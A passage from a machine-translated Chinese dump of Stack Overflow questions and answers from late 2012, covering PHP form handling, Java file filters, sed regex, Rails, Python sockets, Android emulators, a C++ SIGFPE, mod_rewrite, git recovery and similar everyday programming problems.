    $db = substr($string[0],14) . "_" . substr($string[1],14) . "_db.txt";
?>

<input type="hidden" name="filename" value="<?php echo $db; ?>"> 
```

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-12-31T05:48:54.327

`Assuming`您只需复制/粘贴相关代码，您的表格包括`<form method="POST">`

* * *

```
if(isset($_POST['filename'])){
    $filename = $_POST['filename'];
}
if(isset($filename)){ 
    echo $filename;
} 
```

如果`_POST`未设置`filename`，则上述示例中的变量都不会出现。

另一种方法：

```
$filename = false;
if(isset($_POST['filename'])){
    $filename = $_POST['filename'];
 } 
    echo $filename; //guarenteed to be set so isset not needed 
```

在此示例中，文件名的设置与`_POST`. `isset`这应该很好地展示了使用。

更多信息在这里： http: [//php.net/manual/en/function.isset.php](http://php.net/manual/en/function.isset.php)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2017-03-26T19:39:39.433

```
if(isset($_POST['form_field_name'])) {
    $variable_name = $_POST['form_field_name'];
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-12-31T05:45:17.930

将 $_POST 更改为 $_FILES 并确保您的 enctype 是“multipart/form-data”

您的输入字段实际上是否在表单中？

```
<form method="POST" action="update.php">
    <input type="hidden" name="filename" value="test" />
</form> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-09-20T07:12:04.503

简而言之，您可以使用三元运算符

```
$filename = !empty($_POST['filename'])?$_POST['filename']:'-'; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-31T05:45:40.067

```
if(!empty($_POST['filename'])){
$filename = $_POST['filename'];

echo $filename;
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-09-29T12:35:11.593

请试试这个

`error_reporting = E_ALL & ~E_NOTICE`

在 php.ini 中

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-31T05:45:11.333

简单地

```
if(isset($_POST['filename'])){
 $filename = $_POST['filename'];
 echo $filename;
}
else{
 echo "POST filename is not assigned";
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-31T05:46:22.217

用于`isset`此目的

```
<?php

 $index = 1;
 if(isset($_POST['filename'])) {
     $filename = $_POST['filename'];
     echo $filename;
 } 
```

?>

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-05-12T12:17:36.860

用于`empty()`检查它是否可用。尝试 -

如果主机不在此处，将生成错误

```
if(!empty($_GET["host"]))
if($_GET["host"]!="") 
```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2018-09-05T04:42:35.323

```
enctype="multipart/form-data" 
```

提交前检查表单中的 enctype

# java - 在java中过滤文件

> ID：14097901
> 
> 赞同：2
> 
> 时间：2012-12-31T05:41:57.413
> 
> 标签：java, string

我想对 Java 中的文件进行过滤。

是否可以创建过滤器来检查文件是否以“汽车”开头并以`color.js`

我创建了这段代码来检查字符串的结尾是否等于`color.js`但我如何检查字符串是否以'car'开头

```
File folder = new File("C:\\test);
    FilenameFilter filter = new FilenameFilter() {
        public boolean accept(File folder, String fileName) {
            return fileName.endsWith("color.js");
        }
    };

    //File[] listOfFiles = folder.listFiles();
    String[] myFiles = folder.list(filter); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T05:45:02.093

快速简单的方法：

```
public boolean accept(File folder, String fileName) {
        return fileName.endsWith("color.js") && filename.startsWith("car");
    } 
```

[也许你会发现使用正则表达式](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html)更方便：

```
public boolean accept(File folder, String fileName) {
        return fileName.matches("car.*color[.]js");
    } 
```

但是这样你应该小心在正则表达式模式中看起来是特殊字符的符号。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T05:43:46.030

以您使用过的相同方式`String#endsWith`，您可以使用`String#startsWith`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T05:45:11.020

尝试

```
public boolean accept(File folder, String fileName) {
    return fileName.endsWith("color.js") && fileName.startsWith("car");
} 
```

# regex - sed 用正则表达式替换 bbcodes

> ID：14097904
> 
> 赞同：1
> 
> 时间：2012-12-31T05:42:19.620
> 
> 标签：regex, linux, sed, bbcode

我想替换特定的 BBCode，例如

```
[youtube]http://youtube.com/watch?v=00000000000[\youtube]
[youtube]http://youtu.be/00000000000[\youtube]
[youtube]http://youtu.be/00000000000/[\youtube]
[youtube]http://youtube.com/watch?v=00000000000&something=wrong[\youtube]
[youtube]youtube.com/watch?v=00000000000[\youtube] 
```

到

```
[MEDIA=youtube]00000000000[\MEDIA] 
```

我当前的模式没有匹配项：

```
 sed -i 's/\[youtube\]\(http:\/\/|https:\/\/|.*\)\(www\.|.*\)youtu\(be\.com|\.be\)\(\/watch\?v=|\/\)\([a-zA-Z0-9-]{11}\)\(.*\)\[\/youtube\]/\[MEDIA=youtube\]\5\[\/MEDIA\]/g' text.txt 
```

你怎么看待这件事？我的错在哪里？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:53:43.450

一种方法：

```
sed -n '/^\[youtube\]/{s/[^0-9]*\([0-9]*\)*.*/[MEDIA=youtube]\1[\\MEDIA]/p}' input 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T14:31:31.763

使用 awk 的可能解决方案（将其放入 file.awk 和 file.txt 是您的输入）。

awk -f 文件.awk 文件.txt

**文件.awk**

```
BEGIN {
    # a list of patterns
    lp = \
    "http://youtube.com/watch?v= http://youtube.com/watch?v=/ " \
    "http://youtu.be/ http://youtube.com/watch?v=/ " \
    "youtube.com/watch?v="

    # escape ?
    gsub("?", "\\?", lp)

    # add [youtube]
    media="youtube"
    gsub("[ ^]", " \\[" media "]", lp)

    # make array of patterns
    split(lp, pat, " ")
}

{
    for (i in pat) {
       n=split($0, arr, pat[i])
       if (n>1) {
           # remove rest of the string
           gsub("[/[&].*", "", arr[2])
           printf "[MEDIA=%s]%s[MEDIA]\n", media, arr[2]
       }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T21:57:35.953

这可能对您有用（GNU sed）：

```
sed -ri '\|^\[([^]]+)\](http://)?[^/]*/(watch\?v=)?(.{11}).*\[\\\1\]$|s//[MEDIA=\1]\4[\\MEDIA]/' file 
```

# ruby-on-rails - 如何将 Application.html.erb 上的链接添加到其他视图？

> ID：14097909
> 
> 赞同：0
> 
> 时间：2012-12-31T05:42:46.040
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我有一个配置文件脚手架（以及使用 Devise 创建的用户），每个用户都有一个配置文件，并希望显示来自我的 application.html.erb 的单个用户配置文件的链接。

问题是，这段代码在 /views/profiles/index.html.erb 中有效，但在 /layouts/application.html.erb 中无效

```
<td><%= link_to 'Show', profile %></td>
<td><%= link_to 'Edit', edit_profile_path(profile) %></td> 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:50:14.587

在您的应用程序布局中，`profile`变量并不总是被设置。在profiles#index 操作中，我猜您的视图中有这样的代码：`@profiles.each do |profile|`

这是获取配置文件的集合并遍历它们，将每个配置文件对象传递给块，在本例中是渲染链接。

在您所描述的情况下，如果您想从任何页面显示指向当前用户个人资料的链接，您首先需要查看是否有当前用户登录，然后在该当前用户上调用 profile 方法。所以：

```
<% if current_user %>
  <%= link_to 'Edit Profile', edit_profile_path(current_user.profile) %>
<% end %> 
```

更一般地说，在您使用需要参数的路径帮助程序的任何情况下，您都必须确保传入已定义的变量。

# python - 线程python绑定几个端口

> ID：14097910
> 
> 赞同：0
> 
> 时间：2012-12-31T05:42:48.850
> 
> 标签：python, multithreading

我想做一件简单的事情：只需绑定两个端口以等待传入连接并与应用程序代码连续。这是代码。

```
import socket
import threading
import Queue

q = Queue.Queue()
q2 = Queue.Queue()

def escucha_9003():

    s = socket.socket()
    s.bind(("localhost",9023))
    s.listen(10) 
    sc, address = s.accept()
    q.put(sc)

def escucha_9004():

    s2 = socket.socket()
    s2.bind(("localhost",9024))
    s2.listen(10) 
    sc2, address2 = s2.accept()
    q.put(sc2)

hilo = threading.Thread(target=escucha_9003).start()
sc2=q.get()
hilo2 = threading.Thread(target=escucha_9004).start()
sc=q2.get()

print "i never arrive here" 
```

我需要获取每个函数中返回的一些参数。我使用队列库来做到这一点。但问题是我想继续使用代码并且我从来没有到达这条线：打印“我从来没有到达这里”。至少它永远不会被打印出来。

在启动这两个线程并处理传入连接后，我需要如何继续开发。

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:46:03.687

两个`.get()`呼叫都是阻塞呼叫。此外，`.accept()`您的线程中的调用是阻塞的。`.accept()`从技术上讲，如果没有来自客户端的连接，您甚至不应该通过这两个电话。因为主线程正在等待`get()`来自队列的调用，但队列从不放任何东西，因为线程正在等待接受未来的连接。

您需要做的是从线程内部而不是主线程内部处理队列。否则，您将需要`.get(timeout=someSeconds)`在事件循环内部使用，在该循环中您在一定时间内不断检查队列中的更多内容，然后继续进行更多连续处理。

您可能想准确解释您要实现的目标，然后在阻塞主线程接收数据之前重组这些线程以处理更多自己的工作。

# java - 如何从谷歌应用引擎（java）检索图像到jsp

> ID：14097913
> 
> 赞同：0
> 
> 时间：2012-12-31T05:43:06.513
> 
> 标签：java, google-app-engine, image-uploading, blobstore

我正在寻找将图像检索到 jsp 中。

我找到[了这个链接](https://developers.google.com/appengine/docs/java/blobstore/overview#Complete_Sample_App)。

但是在这我无法将图像检索到我想要的 jsp 中，它只是显示图像

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T09:13:47.667

我建议您将来自 Blobstore 的图像作为图像服务提供服务，它将为您的图像提供更好的性能、尺寸等。

请参阅下面的代码。

```
ImagesService services = ImagesServiceFactory.getImagesService();
ServingUrlOptions serve = ServingUrlOptions.Builder.withBlobKey(blobKey);    // Blobkey of the image uploaded to BlobStore.
String url = services.getServingUrl(serve); 
```

您将获得图像的 URL，您可以轻松地将其放入 HTML 的图像标签中。

```
<img src="url" /> 
```

您可以从这里了解更多关于 AppEngine 的图像服务的信息。[GAE 图像服务](https://developers.google.com/appengine/docs/java/images/overview)

# php - 在 JavaScript 或 jQuery 中递增变量

> ID：14097914
> 
> 赞同：4
> 
> 时间：2012-12-31T05:43:09.833
> 
> 标签：php, javascript, jquery, twitter

我现在正在开发一个 twitter 小部件，它在代码的开头声明了一个 tweetCount。它同时使用 PHP 和 JavaScript。我正在尝试通过简单地使用复制和粘贴对其进行硬编码来清理我工作的代码，现在显然这是一种糟糕的方法，尤其是当我想稍后修改推文计数时。我知道在 PHP 中，您可以创建基于循环中的迭代值递增的变量，即 tweet1、tweet2、tweet3 等。我想知道如何在 JavaScript 或 jQuery 中实现相同的效果。我目前拥有的 JavaScript 的示例代码如下。如果您想查看完整的脚本，可以在[此处查看完整的代码。](https://eliasranzschleifer.com/beta/twittercode.txt)如何在 jQuery 或 JavaScript 中自动递增代码？我看着这个[stackoverflow post](https://stackoverflow.com/questions/9870526/jquery-dynamically-increment-variable-name-inside-a-for-loop)，但不完全了解如何将其集成到我的代码中。现场示例可以在[这里](https://eliasranzschleifer.com/beta/test)找到。任何帮助将非常感激。

**编辑：**

更新了代码以反映 PHP 从 Twitter API 的 JSON 提要中提取的方式的本质

**编辑2：**

切换到纯 JavaScript 以使其更清洁，除了清理代码并使调用全部在客户端。我将更新代码以反映它。感谢您的建议和帮助！

**EDIT3：[最终结果]**

所以我答应我会发布最终代码。这是结果，感谢您提供的所有帮助。我也得到了朋友的一点帮助。[这](https://eliasranzschleifer.com/beta/twittercode.txt)是链接。任何问题？请随时与我联系，我很乐意回答。我最终从切换到纯 JavaScript 中删除了大约 40 行代码，这样你们就可以看到它有多大帮助！此外，我猜出于安全原因，Twitter API 不允许客户端调用，所以不幸的是我不得不在 PHP 中进行调用。用 JavaScript 完成这一切本来会很好，但我想我们将不得不在脚本中使用一点 PHP。尽管在纯 JavaScript 中，代码更简洁！

使 JavaScript 成为可能的代码：

```
<?php
    $tweetData = file_get_contents("https://api.twitter.com/1/statuses/user_timeline.json?screen_name=$username&count=$tweetCount");
    echo "<script> var tweets = " . $tweetData . ";</script>";
?> 
```

初始代码：

```
<?php for($i = 0; $i < $tweetCount; $i++) { ?>
    ${"tweet{$i}"} = $decode[$i][text];
    ${"tweetTime{$i}"} = $decode[$i][created_at];
    <script type="text/javascript">
       var i = "<?php echo $i ?>";
       var tweetTime1 = "<?php echo ${"tweetTime{$i}"} ?>";
       var datebefore1 = new Date(tweetTime1.replace(/^\w+ (\w+) (\d+) ([\d:]+) \+0000 (\d+)$/, "$1 $2 $4 $3 UTC"));
       var tempdate1 = datebefore1.toString();
       var date = "GMT-0800 (Pacific Standard Time)";
       var date1 = tempdate1.split(date)[0];
    </script> <?php
} ?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T06:09:06.560

您可以将所有 php 数据放入 js 变量中，

然后使用纯js，不要再混合它们。

```
//['item1','item2','item3'],js array formation
var jsData = <?php echo $decode ?>;
var jsCount = <?php echo $tweetCount ?>;
for(var i=0;i<jsCount;i++){
    alert(jsData[i]);
} 
```

//或者

```
<script type="text/javascript">
<?php 
for ($i = 0; $i < $tweetCount; $i++) {
?>
    //here you can get your tweet1,tweet2,tweet3...
    var tweet<?php echo $i ?> = "<?php echo $i ?>"+'any data you want to append.';  
<?php
}
?>
</script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T06:24:41.993

为简单起见，您可以从`$tweetCount`数组创建 JavaScript 数组，如下所示：

```
$temp = "var temp = new Array();";
for($i = 0; $i < $tweetCount; $i++) {
   $temp.="temp.push(new Array(".$tweetCount[$i].")";
} 
```

在你的 JavaScript 脚本标签中回显这个`$temp`变量。之后，您可以`temp`在 JavaScript 脚本中使用您的数组，如下所示：

```
for(var i=0;i<temp.length;i++){
    console.log(temp[i]);
} 
```

# android - 启动 AVD 但不显示

> ID：14097915
> 
> 赞同：0
> 
> 时间：2012-12-31T05:43:38.523
> 
> 标签：android, android-emulator, avd

我现在正在学习 Android，并想在 AVD 中模拟我的代码。问题是当我启动 AVD 时，它根本不显示。这是控制台消息。

> [2013-01-04 12:17:35 - SDK 管理器] skin.dynamic=no
> [2013-01-04 12:17:35 - SDK 管理器] hw.keyboard=no
> [2013-01-04 12:17: 35 - SDK 管理器] vm.heapSize=32
> [2013-01-04 12:17:35 - SDK 管理器] hw.ramSize=512

我也已经等了几分钟，但仍然没有出现。这些是我的 AVD 的配置

> 设备：NexusS One
> 目标：API 级别 17（我的目标 SDK 为 2.3.3）
> CPU/ABI = ARM(armeabi-v7a)
> 内存选项 = RAM 512 VM 堆 32
> 内部存储 = 200 MiB
> SD 卡 = 200 MiB

我还检查了 DDMS，但设备列表中根本没有模拟器

有人可以帮我解决这个问题吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2017-03-11T12:52:00.453

Arch Linux 的解决方案：

Emulator AVD 使用自己的库`libstdc++`，但它与 Arch Linux 不兼容。要修复此链接系统库：

```
$ cd <path/to/sdk>/emulator/lib64/libstdc++
$ mv libstdc++.so.6 libstdc++.so.6.bak
$ ln -s /usr/lib64/libstdc++.so.6 
```

为我工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-27T08:25:18.473

如果您的系统中安装了系统映像并安装了图形驱动程序，并且直到无法正常工作，那么您可以尝试一下。

我不确定它是否能解决您的问题，但这是让 android 模拟器快速运行的方法。

现在，如果您的系统有一个具有称为英特尔虚拟化技术的功能的处理器，那么英特尔 X86 映像将为您带来巨大的好处。因为它支持英特尔® 硬件加速执行管理器（英特尔® HAXM）。

要检查您的处理器是否支持 HAXM：**[单击此处](http://ark.intel.com/Products/VirtualizationTechnology)**

您需要在系统中手动安装 Intel HAXM。请按照以下步骤操作。

*   首先去 - adt -> extras -> intel -> Hardware_Accelerated_Execution_Manager
*   确保从 BIOS 设置中启用英特尔虚拟化。
*   现在在您的系统中安装 Intel HAXM 并选择内存量（我更喜欢将其设置为默认值）。
*   安装后创建新的 AVD，其目标应为 API 级别 xx
*   现在将 CPU/ABI 设置为 Intel Atom(x86)。
*   如果您使用的是 Windows，则在设置模拟器时不要将 RAM 值设置为超过 768 MB。
*   运行模拟器。它会比普通的快。

希望对您有所帮助。:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T05:49:46.153

AVD 可以再次尝试配置，通过查看该处理器的工作情况，更改 AMR v7 的设置并工作可能会很好，但会创建一个新的

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-06-28T15:31:11.330

尝试在 Tools/Android/EnableADBIntegration 下禁用 ADB。然后再次启用它。它可能只需要刷新。为我工作。

[https://www.youtube.com/watch?v=OKdth9RmBgo](https://www.youtube.com/watch?v=OKdth9RmBgo)

# php - 在非 ZF2-MVC 环境中使用 ServiceManager

> ID：14097919
> 
> 赞同：1
> 
> 时间：2012-12-31T05:44:15.920
> 
> 标签：php, zend-framework2

我目前正在使用 ZF2 作为库。

目前，我几乎通过路由将我的数据库对象注入到控制器中。显然，如果我首先开始使用 zend 框架 2，我会将 DB 存储到 ServiceManager 的实例中，然后将其发送出去。

无论如何，我有一个充满静态方法的**服务类。**这些方法是基本的，它们所做的只是报告信息。他们几乎是无脑的。我有一个方法：`UserService::getCurrentUser()`旨在返回一个包含当前用户信息的对象。

但是，我正在处理的一个问题是，在这个方法中，我正在这样做：

```
 $user = new objects\user();
    $user->setUserId(self::currentUserId());

    $data = new \model\dao\users($database);
    $user = $data->loadUser($user);

    return $user; 
```

我现在似乎有一个黑洞，我无法获取 $database，在这种情况下，是`Zend\Db\Adapter`.

有什么想法可以堵住这个洞吗？

# c++ - gdb中的算术异常，但我没有被零除？

> ID：14097924
> 
> 赞同：6
> 
> 时间：2012-12-31T05:44:40.473
> 
> 标签：c++, exception, gdb, arithmeticexception

我的`Floating point exception (core dumped)`C++ 程序出现错误，gdb 显示问题出在执行模除法的行上：

```
Program received signal SIGFPE, Arithmetic exception.
[Switching to Thread 0x7ffff6804700 (LWP 13931)]
0x00000000004023e8 in CompExp::eval (this=0x7fffec000e40, currVal=0)
    at exp.cpp:55
55              return (r==0) ? 0 : l % r; 
```

该行防止被零除，我的回溯显示如下：

```
#0  0x00000000004023e8 in CompExp::eval (this=0x7fffec000e40, currVal=0)
    at exp.cpp:55
        l = -2147483648
        r = -1 
```

既然我知道我没有除以零，还有什么可能导致异常？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-31T22:02:15.373

所以我找出了导致问题的原因——算术异常可以通过除以零或有*符号*整数溢出来触发，这就是这里发生的情况。无符号整数溢出时需要回绕；有符号整数的行为未定义。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-31T05:49:30.220

将代码更改为以下内容，以避免尝试对未定义的负数取模：

```
return (r<=0) ? 0 : l % r; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-08-04T13:11:07.630

为了计算这样的模表达式：`-2147483648 % -1`，需要一个除法，在这种情况下，它似乎是一个 32 位除法（我猜`l`并且`r`被定义为`int`）。这种除法的正确结果是`2147483648`，但该值不能用 32 位表示，因此会产生算术异常。

# .htaccess - mod_rewrite 删除尾部斜杠在 Laravel 中不起作用

> ID：14097941
> 
> 赞同：0
> 
> 时间：2012-12-31T05:46:29.957
> 
> 标签：.htaccess, mod-rewrite, laravel, laravel-3

我在我的 Laravel 3 安装的 htaccess 文件中有以下代码设置：

```
# Removes trailing slashes (prevents SEO duplicate content issues)
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.+)/$ $1 [L,R=301]

# Enforce www
RewriteCond %{HTTP_HOST} ^([0-9a-z-]+)\.([0-9a-z-]+)$ [NC]
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]

# Remove index.php from base URL
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php/$1 [L] 
```

在访问第一个 ReWrite 条件之前，这看起来一切都很好。

导航到这个网址：

```
/information/ 
```

将我重定向到：

```
/home/xxx/Dropbox/Development/laravel/httpdocs/information 
```

因此，尾部斜杠被删除，但它重定向到绝对 URL。

为什么这样做？我如何解决它？

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T06:02:48.547

在所有规则之上添加一个`RewriteBase /`（或任何基本 URI 应该是）。

发生的事情是 mod_rewrite 尝试猜测重写规则的目标是 URL 路径还是文件路径，并且它错误地猜测它是文件路径并附加了不正确的基本路径。

# iphone - FBConnect 在登录时使我的应用程序崩溃

> ID：14097942
> 
> 赞同：0
> 
> 时间：2012-12-31T05:46:30.100
> 
> 标签：iphone, ios, facebook, fbconnect

我正在尝试将我的应用程序与 FBConnect 连接，但每次都会崩溃。它需要所有以前的凭据，然后在登录后崩溃。我需要将其与此连接，以便在登录时我的应用程序应该打开。

我的代码是

```
- (void)session:(FBSession*)session didLogin:(FBUID)uid {
    NSString* fql = [NSString stringWithFormat:
                 @"select uid,name from user where uid == %lld", self.usersession.uid];
    NSDictionary* params = [NSDictionary dictionaryWithObject:fql forKey:@"query"];
    [[FBRequest requestWithDelegate:self] call:@"facebook.fql.query" params:params];
    self.post=YES;
    self.usersession =session;
    NSLog(@"User with id %lld logged in.", uid);
    [self getFacebookName];
} 
```

**错误**

```
2012-12-31 11:13:16.522 Project[296:11c03] User with id 10000456096786 logged in.
2012-12-31 11:13:16.922 Project[296:11c03] *** Terminating app due to uncaught exception 'NSRangeException', reason: '*** -[__NSArrayM objectAtIndex:]: index 0 beyond bounds for empty array'
** First throw call stack:
(0x17c5052 0x1c58d0a 0x17b1db8 0xa0d5 0x6ed14 0x6f477 0xffea59 0xffce94 0xffdeb7 0xffce4f 0xffcfd5 0xf41f6a 0x20febbd 0x21cb5ea 0x21cb8b5 0x20f5298 0x21cb16b 0x20f5137 0x179997f 0x16fcb73 0x16fc454 0x16fbdb4 0x16fbccb 0x2473879 0x247393e 0x609a9b 0x27c8 0x2725) 
```

如果我在成功登录后输入我的代码`session didlogin`以进入应用程序。它与同样的事情崩溃......

```
- (void)session:(FBSession*)session didLogin:(FBUID)uid {

    NSString* fql = [NSString stringWithFormat:
                 @"select uid,name from user where uid == %lld", self.usersession.uid];
    NSDictionary* params = [NSDictionary dictionaryWithObject:fql forKey:@"query"];
    [[FBRequest requestWithDelegate:self] call:@"facebook.fql.query" params:params];
    self.post=YES;

    self.usersession =session;
    NSLog(@"User with id %lld logged in.", uid);

    AppDelegate *appdelegte =(AppDelegate*)[[UIApplication sharedApplication]delegate];

    [[[appdelegte navigationController] view]removeFromSuperview];

    [[appdelegte window]addSubview:[[appdelegte tabBarController]view]];

    [[appdelegte tabBarController]setSelectedIndex:0];

    [self getFacebookName];
}

- (void)getFacebookName {
NSString* fql = [NSString stringWithFormat:
                 @"select uid,name from user where uid == %lld", self.usersession.uid];
NSDictionary* params = [NSDictionary dictionaryWithObject:fql forKey:@"query"];
[[FBRequest requestWithDelegate:self] call:@"facebook.fql.query" params:params];
self.post=YES;
} 
```

# php - 在循环中包含 include()

> ID：14097953
> 
> 赞同：0
> 
> 时间：2012-12-31T05:48:41.273
> 
> 标签：php, loops, include

我有这段代码可以将数据循环到我的网站：

```
$loop = Array();

# LOOP
foreach($sql->query($get_blogposts) AS $blogpost) {
    echo '<div class="blogpost-avatar" style="background-image: url('.url('images/avatars/avatar-cropped.jpg').');"></div>';

    echo '<div class="blogpost-information">';
        include(DIR_REQUIRED.'/blogpost-information.php');
    echo '</div>';

    echo '<div class="blogpost-content">';
        echo $blogpost['message'];
    echo '</div>';
}

echo implode('<hr>', $loop); 
```

问题是我不知道如何`$loop[] =`进入`foreach`循环。我已经这样测试过：

```
 $loop[] = '<div class="blogpost-avatar" style="background-image: url('.url('images/avatars/avatar-cropped.jpg').');"></div>

    <div class="blogpost-information">'.
        include(DIR_REQUIRED.'/blogpost-information.php')
    .'</div>

    <div class="blogpost-content">'.
        $blogpost['message']
    .'</div>'; 
```

但我收到错误消息“打开失败......包含”。我什至测试过在`=`这样的前面添加一个点：`$loop[] .=`但这也不起作用。

我该如何解决我的问题？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T06:02:27.440

使用输出缓冲区怎么样！

```
$loop = Array();    # LOOP
foreach($sql->query($get_blogposts) AS $blogpost) {
  $str = '';
  $str .= '<div class="blogpost-avatar" style="background-image: url('.url('images/avatars/avatar-cropped.jpg').');"></div>';

  $str .= '<div class="blogpost-information">';

  ob_start();

  include(DIR_REQUIRED.'/blogpost-information.php');
  $str .= ob_get_contents();
  ob_end_clean();

  $str .= '</div>';

  $str .= '<div class="blogpost-content">';
  $str .= $blogpost['message'];
  $str .= '</div>';
  $loop[] = $str;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T06:06:53.423

```
<?php

$loop = array();

foreach ($sql->query($get_blogposts) as $blogpost) 
{
    ob_start();

        echo '<div class="blogpost-avatar" style="background-image: url('.url('images/avatars/avatar-cropped.jpg').');"></div>';
        echo '<div class="blogpost-information">';

        include DIR_REQUIRED.'/blogpost-information.php';

        echo '</div>';
        echo '<div class="blogpost-content">';
        echo $blogpost['message'];
        echo '</div>';

    $loop[] = ob_get_contents();
    ob_end_clean();
}

echo implode('<hr>', $loop);

?> 
```

[http://php.net/manual/en/function.ob-get-contents.php](http://php.net/manual/en/function.ob-get-contents.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T06:09:06.023

我假设“blogpost-information.php”文件中存储了一些静态信息，因为您添加文件内容的方式，得出这个结论。如果我的猜测是正确的，那么以下解决方案可能会起作用 -

> $str = "";
> if(file_exists(DIR_REQUIRED.'/blogpost-information.php')){
>   $str = fgets(DIR_REQUIRED.'/blogpost-information.php');
> }
> array_push($loop, "blah blah ".$str."blah blah ");

# git - GitHub 在创建存储库时覆盖了本地文件

> ID：14097959
> 
> 赞同：2
> 
> 时间：2012-12-31T05:49:00.883
> 
> 标签：git, github

在尝试创建存储库的过程中，我覆盖了包含整个项目的文件夹的现有内容。当我在文件夹中创建存储库时发生了这种情况。有什么方法可以取回文件夹内容还是我只是 SOL.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:26:01.243

如果你提交了任何东西，你仍然应该让 git 保存你的文件。

在控制台中，检查`git status`显示的内容，然后四处寻找您的文件。如果您在任何时候都没有看到您的文件，那么请随时签出以提交您认为包含您的内容的文件

```
git checkout <commit_id> 
```

请注意，这`commit_id`不是您的提交消息`"Original push"`，而是看起来很有趣的字符串`65a0dc...`

您可以通过使用找到提交 id `git log`（或者`git log --all`如果您在分支之间切换并感到完全迷失）。

# javascript - Javascript无法在所有浏览器上突然运行

> ID：14097961
> 
> 赞同：0
> 
> 时间：2012-12-31T05:49:11.203
> 
> 标签：javascript, character, semantics

嗨，我一直在使用非常轻量和通用的 javascript（简单查询，更少，我以前使用过的滑块）制作一个相当简单的页面，一切都很好，直到所有 javascript 随机停止在所有浏览器中工作。我的网络检查员这样说 ![在此处输入图像描述](../Images/ac521c19fc5408000917dac3e6c5a85c.png)

我所有的 javascript 在 web 检查器中都以另一种语言显示，并显示“语义问题无效字符/u12709”我什至不知道该字符在哪里。发生这种情况时，我什至没有使用 javascript。我将一些文本复制到 html 中，只需复制即可。您可以在 densciencega.com 上查看完整页面，或者这里只是头部代码

```
<head>
<title>Dent Science</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript" src="//use.typekit.net/yfc0oou.js"></script>
<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
<link rel="stylesheet/less" type="text/css" href="main.less" />
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript" src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<script type="text/javascript" src="scripts/less-1.3.3.min.js"></script>
<script type="text/javascript" src="scripts/main.js"></script>
<script type="text/javascript" src="scripts/smooth.pack.js"></script>
<script type="text/javascript" src="scripts/jquery.bxslider.min.js"></script>

</head> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:55:21.007

您的 JavaScript 文件的本地副本是否正确，并且仅在您上传后才出现损坏？

尝试更改您的 FTP 设置以强制二进制上传而不是 ASCII - 我之前在 FileZilla 使用 ASCII 上传时看到过这种情况。

# regex - 正则表达式无法搜索所有

> ID：14097962
> 
> 赞同：0
> 
> 时间：2012-12-31T05:49:21.667
> 
> 标签：regex, vb.net

所以基本上考虑这个例子：

```
google123         

   apples

   doodle1234 
```

我用过环顾四周

```
(?<=google123)([^\n]*\n[\s*\w+])+(?=doodle1234) 
```

不幸的是，对我来说它只适用于

```
google123         

   apples

doodle1234 
```

注意：第一个例子中，空格“doodle1234”不被它识别，它只识别“doodle1234”。

搜索输出必须是苹果

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:40:51.057

更改`[\s*\w+]`为`[\s*\w+]+`或`[\s*\w+]*`：

解释：

> ***`*`*** 匹配前一个元素零次或***多次***。
> 
> ***`+`*** 匹配前一个元素一次或***多次***。

你`regex`可以是这样的：

```
(?<=google123)([^\n]*\n[\s*\w+]*)+(?=doodle1234) 
```

或者您可以使用`*?`或`+?`：

> ***`*?`*** 匹配前一个元素零次或多次，但**尽可能少**。
> 
> ***`+?`*** 匹配前一个元素一次或多次，但**尽可能少**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:59:36.360

您的语法在这里是错误的：

```
[\s*\w+] 
```

（您在字符类中包含星号。）相反：

```
\s*\w+ 
```

# javascript - 为什么元素从他的父母中移除？

> ID：14097966
> 
> 赞同：0
> 
